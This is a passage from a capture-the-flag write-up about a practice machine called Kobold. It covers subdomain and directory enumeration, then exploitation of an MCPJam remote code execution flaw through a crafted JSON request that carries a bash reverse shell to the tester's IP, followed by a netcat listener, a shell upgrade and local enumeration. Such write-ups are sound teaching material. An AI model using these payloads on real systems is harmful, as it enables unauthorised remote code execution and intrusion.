+:: Progress: [19966/19966] :: Job [1/1] :: 1941 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>On HTTPS, the default behavior looks like redirecting to <code class="language-plaintext highlighter-rouge">https://kobold.htb/</code> without preserving the path:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> https://10.129.245.50 <span class="nt">-I</span>
+<span class="go">HTTP/1.1 302 Moved Temporarily
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:32:54 GMT
+Content-Type: text/html
+Content-Length: 154
+Connection: keep-alive
+Location: https://kobold.htb/
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> https://10.129.245.50/test <span class="nt">-I</span>
+<span class="go">HTTP/1.1 302 Moved Temporarily
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:32:59 GMT
+Content-Type: text/html
+Content-Length: 154
+Connection: keep-alive
+Location: https://kobold.htb/
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> https://10.129.245.50/test <span class="nt">-I</span> <span class="nt">-H</span> <span class="s2">"Host: 0xdf.kobold.htb"</span>
+<span class="go">HTTP/1.1 302 Moved Temporarily
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:33:17 GMT
+Content-Type: text/html
+Content-Length: 154
+Connection: keep-alive
+Location: https://kobold.htb/
+</span></code></pre></div></div>
+
+<p>There are two subdomains in the wordlist that do something different:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-k</span> <span class="nt">-u</span> https://10.129.245.50 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.kobold.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://10.129.245.50
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.kobold.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 100ms]
+bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 155ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 1626 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>They each reply with an HTTP 200 (rather than a 302). Those look like actual websites. I’ll update my <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb
+</code></pre></div></div>
+
+<p>I’ll rescan port 80 and 443 with <code class="language-plaintext highlighter-rouge">nmap</code> targeting the hostname rather than the IP, but not find anything interesting.</p>
+
+<h3 id="koboldhtb---tcp-443">kobold.htb - TCP 443</h3>
+
+<h4 id="site">Site</h4>
+
+<p>The site is a generic page for a “Coming Soon” platform for managing agents:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721170002743.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721170002743.png" alt="image-20260721170002743" class="include_image " />
+</picture>
+
+<p>There’s an email at the bottom, <code class="language-plaintext highlighter-rouge">admin@kobold.htb</code>.</p>
+
+<h4 id="tech-stack">Tech Stack</h4>
+
+<p>The HTTP response headers show just Nginx:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.24.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 17:55:41 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Sun, 15 Mar 2026 15:50:24 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"69b6d540-ee4"</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3812</span>
+</code></pre></div></div>
+
+<p>The main page loads as <code class="language-plaintext highlighter-rouge">/index.html</code>. This is looking very much like a static HTML site.</p>
+
+<p>The 404 page matches the default <a href="/cheatsheets/404#php-fpm">PHP-FPM 404</a>:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not Found</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.24.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 21:12:39 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">16</span>
+
+File not found.
+</code></pre></div></div>
+
+<p>That suggests there is some PHP processing going on.</p>
+
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since it could be PHP:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-k</span> <span class="nt">-u</span> https://kobold.htb <span class="nt">-x</span> php
+<span class="go">                                                                                                                                       
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://kobold.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        1l        3w       16c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      186l      380w     3812c https://kobold.htb/
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 32s    30000/30000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:1       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 31s    30000/30000   967/s   https://kobold.htb/    
+</span></code></pre></div></div>
+
+<p>Nothing at all.</p>
+
+<h3 id="binkoboldhtb---tcp-443">bin.kobold.htb - TCP 443</h3>
+
+<h4 id="site-1">Site</h4>
+
+<p>The site is an instance of <a href="https://privatebin.info/">PrivateBin</a>:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172656370.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172656370.png" alt="image-20260721172656370" /><em>Click for full size image</em></a></p>
+
+<p>I can create a doc (and it seems to escape HTML):</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172828960.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172828960.png" alt="image-20260721172828960" /><em>Click for full size image</em></a></p>
+
+<p>The link goes to the doc with an expiration time:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172855797.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721172855797.png" alt="image-20260721172855797" /><em>Click for full size image</em></a></p>
+
+<h4 id="tech-stack-1">Tech Stack</h4>
+
+<p>The HTTP response headers show Nginx:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.24.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 21:23:08 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, no-transform, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 21:23:08 GMT</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 21:23:08 GMT</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept</span>
+<span class="na">Content-Security-Policy</span><span class="p">:</span> <span class="s">default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads</span>
+<span class="na">Cross-Origin-Resource-Policy</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Cross-Origin-Embedder-Policy</span><span class="p">:</span> <span class="s">require-corp</span>
+<span class="na">Permissions-Policy</span><span class="p">:</span> <span class="s">browsing-topics=()</span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">no-referrer</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">deny</span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">template=bootstrap5; secure; SameSite=Lax</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">24402</span>
+</code></pre></div></div>
+
+<p><a href="https://github.com/PrivateBin/PrivateBin">PrivateBin’s GitHub</a> shows that it’s a PHP application. Still, anything that isn’t a known path seems to load the main page.</p>
+
+<p>The footer shows that this is version 2.0.2.</p>
+
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> because PrivateBin is written in PHP:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-k</span> <span class="nt">-u</span> https://bin.kobold.htb <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://bin.kobold.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      385l     1607w        -c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        1l        3w       16c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       11w      162c https://bin.kobold.htb/img =&gt; </span><span class="feroxbuster-yellow">http://bin.kobold.htb:8080/img/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       11w      162c https://bin.kobold.htb/js =&gt; </span><span class="feroxbuster-yellow">http://bin.kobold.htb:8080/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       11w      162c https://bin.kobold.htb/css =&gt; </span><span class="feroxbuster-yellow">http://bin.kobold.htb:8080/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       11w      162c https://bin.kobold.htb/i18n =&gt; </span><span class="feroxbuster-yellow">http://bin.kobold.htb:8080/i18n/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 4m     30000/30000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     30000/30000   125/s   https://bin.kobold.htb/
+</span></code></pre></div></div>
+
+<p>Nothing important, but an interesting misconfiguration on the redirect. For example, <code class="language-plaintext highlighter-rouge">/js</code> is meant to redirect to <code class="language-plaintext highlighter-rouge">/js/</code>. But it changes the port to 8080. So visiting <code class="language-plaintext highlighter-rouge">https://bin.kobold.htb/js</code> actually redirects to a port that isn’t open.</p>
+
+<p>This doesn’t cause any practical impact, as that directory isn’t meant to be accessed like that anyway. But it leaks that Nginx is likely proxying to port 8080 internally.</p>
+
+<h3 id="mcpkoboldhtb---tcp-443">mcp.kobold.htb - TCP 443</h3>
+
+<h4 id="site-2">Site</h4>
+
+<p>The site is an instance of <a href="https://www.mcpjam.com/">MCPJam</a>:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721173451311.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721173451311.png" alt="image-20260721173451311" class="include_image " />
+</picture>
+
+<p><a href="https://www.mcpjam.com/">MCPJam</a> describes itself as:</p>
+
+<blockquote>
+  <p>From your first prompt to a continuous gate on every release, MCPJam shows what breaks across every AI client — and how to fix it.</p>
+</blockquote>
+
+<h4 id="tech-stack-2">Tech Stack</h4>
+
+<p>The HTTP response headers show just Nginx:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.24.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Jul 2026 21:33:35 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">access-control-allow-credentials</span><span class="p">:</span> <span class="s">true</span>
+<span class="na">vary</span><span class="p">:</span> <span class="s">Origin</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">466</span>
+</code></pre></div></div>
+
+<p><a href="https://github.com/MCPJam/inspector">MCPJam’s GitHub</a> shows it’s written in TypeScript.</p>
+
+<p>There is no 404 page, but rather it just shows the main dashboard.</p>
+
+<p>In Settings, it shows version v.1.4.2.</p>
+
+<p>I’ll skip the brute force here.</p>
+
+<h3 id="arcane---tcp-3552">Arcane - TCP 3552</h3>
+
+<h4 id="site-3">Site</h4>
+
+<p>The application on TCP 3552 is an instance of <a href="https://github.com/getarcaneapp/arcane">Arcane</a>:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721202313178.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721202313178.png" alt="image-20260721202313178" class="include_image " />
+</picture>
+
+<p>Arcane describes itself as “Modern Docker Management, Designed for Everyone”.</p>
+
+<p>I’ll try some simple guesses, but nothing works. I’ll have to come back with creds.</p>
+
+<h4 id="tech-stack-3">Tech Stack</h4>
+
+<p>The footer shows the version is 1.13.0.</p>
+
+<p>The HTTP response headers interestingly don’t have a <code class="language-plaintext highlighter-rouge">Server</code> header:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, must-revalidate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2081</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 22 Jul 2026 00:21:44 GMT</span>
+</code></pre></div></div>
+
+<p>Arcane is written in Go. The 404 page looks to be custom to this application:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721202546401.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721202546401.png" alt="image-20260721202546401" class="include_image " />
+</picture>
+
+<h2 id="shell-as-ben">Shell as ben</h2>
+
+<h3 id="cve-2026-23744">CVE-2026-23744</h3>
+
+<p>I’ll find CVEs in all three software applications hosted on this box, but the one that matters first is in MCPJam:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721204459603.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260721204459603.png" alt="image-20260721204459603" class="include_image " />
+</picture>
+
+<p>NIST describes <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23744">CVE-2026-23744</a> as:</p>
+
+<blockquote>
+  <p>MCPJam inspector is the local-first development platform for MCP servers. Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. Version 1.4.3 contains a patch.</p>
+</blockquote>
+
+<p>This vulnerability scored 9.8 on CVSS. The MCPJam API is meant to listen only on localhost, but here it binds to 0.0.0.0, which means it can be reached from off the host. This allows an attacker to create a malicious MCP that returns a shell.</p>
+
+<p><a href="https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6">This GitHub advisory</a> has a lot of good detail, including POC payloads.</p>
+
+<h3 id="rce">RCE</h3>
+
+<h4 id="poc">POC</h4>
+
+<p>To exploit this, I need to send the following payload to <code class="language-plaintext highlighter-rouge">/api/mcp/connect</code>:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"serverConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;command&gt;"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="err">&lt;args&gt;</span><span class="p">],</span><span class="w">
+        </span><span class="nl">"env"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"serverId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0xdf"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I’ll start with a command of <code class="language-plaintext highlighter-rouge">ping</code> and args of <code class="language-plaintext highlighter-rouge">-c 1 10.10.15.217</code>:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> https://mcp.kobold.htb/api/mcp/connect <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"serverConfig": {"command": "ping", "args": ["-c", "1", "10.10.15.217"], "env": {}}, "serverId": "0xdf"}'</span>
+<span class="go">{"success":false,"error":"Connection failed for server 0xdf: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}
+</span></code></pre></div></div>
+
+<p>It returns an error, but on my listening <code class="language-plaintext highlighter-rouge">tcpdump</code>, I get pinged:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+07:35:53.604409 IP 10.129.245.50 &gt; 10.10.15.217: ICMP echo request, id 4046, seq 1, length 64
+07:35:53.604429 IP 10.10.15.217 &gt; 10.129.245.50: ICMP echo reply, id 4046, seq 1, length 64
+</span></code></pre></div></div>
+
+<h4 id="shell">Shell</h4>
+
+<p>I’ll update my payload to be a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> https://mcp.kobold.htb/api/mcp/connect <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"serverConfig": {"command": "bash", "args": ["-c", "bash -i &gt;&amp; /dev/tcp/10.10.15.217/443 0&gt;&amp;1"], "env": {}}, "serverId": "0xdf"}'</span>
+</code></pre></div></div>
+
+<p>It hangs, but at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.245.50 41772
+bash: cannot set terminal process group (1588): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>The shell is running as ben, which must be the user MCPJam is running as.</p>
+
+<p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 sudo nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">sudo nc -lnvp 443
+</span><span class="gp">                 ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">12c4459c************************
+</span></code></pre></div></div>
+
+<h2 id="shell-as-nobody-in-privatebin">Shell as nobody in PrivateBin</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<h4 id="users">Users</h4>
+
+<p>ben’s home directory is pretty empty:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>  
+<span class="go">total 28
+drwxr-x--- 3 ben  ben  4096 Mar 16 14:12 .
+drwxr-xr-x 4 root root 4096 Mar 15 21:23 ..
+-rw-r--r-- 1 ben  ben     0 Mar 16 14:12 .bash_history
+-rw-r--r-- 1 ben  ben   220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 ben  ben  3771 Mar 31  2024 .bashrc
+drwx------ 2 ben  ben  4096 Mar 15 21:23 .cache
+-rw-r--r-- 1 ben  ben   807 Mar 31  2024 .profile
+-rw-r----- 1 root ben    33 Jul 21 17:34 user.txt
+</span></code></pre></div></div>
+
+<p>There is one other user with a home directory in <code class="language-plaintext highlighter-rouge">/home</code>, alice:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">alice  ben
+</span></code></pre></div></div>
+
+<p>alice and root are the only other users with shells set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+ben:x:1001:1001::/home/ben:/bin/bash
+alice:x:1002:1002::/home/alice:/bin/bash
+</span></code></pre></div></div>
+
+<p>Trying to run <code class="language-plaintext highlighter-rouge">sudo -l</code> to list ben’s sudo privileges requires a password, which I don’t have.</p>
+
+<p>ben is a member of the operator group:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+</span></code></pre></div></div>
+
+<h4 id="privatebin-docker">PrivateBin Docker</h4>
+
+<p><code class="language-plaintext highlighter-rouge">/opt</code> has a <code class="language-plaintext highlighter-rouge">containerd</code> directory, which suggests Docker. There’s also a <code class="language-plaintext highlighter-rouge">privatebin-data</code> directory in the system root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">app  boot   dev  home  lib64       media  opt              proc  run   snap  sys  usr
+bin  cdrom  etc  lib   lost+found  mnt    privatebin-data  root  sbin  srv   tmp  var
+</span><span class="gp">ben@kobold:/$</span><span class="w"> </span><span class="nb">ls </span>privatebin-data/
+<span class="go">certs  cfg  data
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">certs</code> has the TLS certificates used for the site:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data$</span><span class="w"> </span><span class="nb">ls </span>certs/
+<span class="go">cert.pem  key.pem
+</span></code></pre></div></div>
+
+<p>ben is not able to access <code class="language-plaintext highlighter-rouge">cfg</code> (presumably the config). <code class="language-plaintext highlighter-rouge">data</code> has actual data from the instance:</p>
+
